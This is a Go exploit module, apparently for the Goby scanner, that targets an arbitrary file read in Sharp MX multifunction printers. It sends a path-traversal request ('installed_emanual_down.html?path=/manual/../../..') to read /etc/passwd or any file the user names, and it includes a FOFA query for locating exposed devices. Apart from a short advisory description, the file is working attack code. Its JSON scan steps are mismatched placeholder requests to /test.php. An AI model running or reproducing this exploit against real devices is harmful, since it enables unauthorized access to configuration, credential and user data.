package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Sharp MX Printers installed_emanual_down.html File Read Vulnerability",
    "Description": "<p>Sharp Corporation is a renowned Japanese electronics company, established in 1912. It originally started with the manufacture of mechanical pencils. With the advancement of technology, Sharp gradually expanded its product line into various electronic devices, including printers and multifunction printers (MFPs).</p>",
    "Product": "SHARP-MX-Printer",
    "Homepage": "http://www.sharp.co.jp/",
    "DisclosureDate": "2024-08-08",
    "PostTime": "2024-08-08",
    "Author": "1538279017@qq.com",
    "FofaQuery": "title=\"MX-\" && body=\"document.main.submit()\"",
    "GobyQuery": "title=\"MX-\" && body=\"document.main.submit()\"",
    "Level": "1",
    "Impact": "<p>The arbitrary file read vulnerability in Sharp multifunction printers allows attackers to read any file on the device. This can lead to the exposure of sensitive information, including configuration files, user data, and other confidential information stored on the device.</p>",
    "Recommendation": "<p>Update Firmware: Regularly update the printer firmware to the latest version to ensure that it includes the manufacturer's vulnerability fixes. </p><p>Network Isolation: Deploy printers in a trusted network environment and restrict unnecessary external access.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Linux",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "Sharp多功能打印机 installed_emanual_down.html 任意文件读取漏洞",
            "Product": "SHARP-MX打印机",
            "Description": "<p>Sharp Corporation 是一家知名的日本电子公司，成立于1912年，最初以制造机械铅笔起家。随着科技的发展，Sharp 逐步扩展其产品线，进入了多种电子设备领域，包括打印机和多功能一体机（MFP）。<br></p>",
            "Recommendation": "<p>更新固件：定期更新打印机固件到最新版本，以确保包含厂商的漏洞修复。</p><p>网络隔离：将打印机部署在受信任的网络环境中，限制不必要的外部访问。</p>",
            "Impact": "<p>Sharp 多功能打印机的任意文件读取漏洞允许攻击者读取设备上的任意文件。这可能导致敏感信息泄露，包括配置文件、用户数据和其他存储在设备上的机密信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Sharp MX Printers installed_emanual_down.html File Read Vulnerability",
            "Product": "SHARP-MX-Printer",
            "Description": "<p>Sharp Corporation is a renowned Japanese electronics company, established in 1912. It originally started with the manufacture of mechanical pencils. With the advancement of technology, Sharp gradually expanded its product line into various electronic devices, including printers and multifunction printers (MFPs).<br></p>",
            "Recommendation": "<p>Update Firmware: Regularly update the printer firmware to the latest version to ensure that it includes the manufacturer's vulnerability fixes.&nbsp;</p><p>Network Isolation: Deploy printers in a trusted network environment and restrict unnecessary external access.<br></p>",
            "Impact": "<p>The arbitrary file read vulnerability in Sharp multifunction printers allows attackers to read any file on the device. This can lead to the exposure of sensitive information, including configuration files, user data, and other confidential information stored on the device.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9922"
}`

	postOrGet_DHSAJSJDJDS := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/installed_emanual_down.html?path=/manual/../../.." + fileUrl

		resp, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/installed_emanual_down.html?path=/manual/../../.."

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"/etc/passwd": "root",
			}

			// 函数继承

			uploadFileFunc := postOrGet_DHSAJSJDJDS

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_DHSAJSJDJDS

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Linux"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))
}
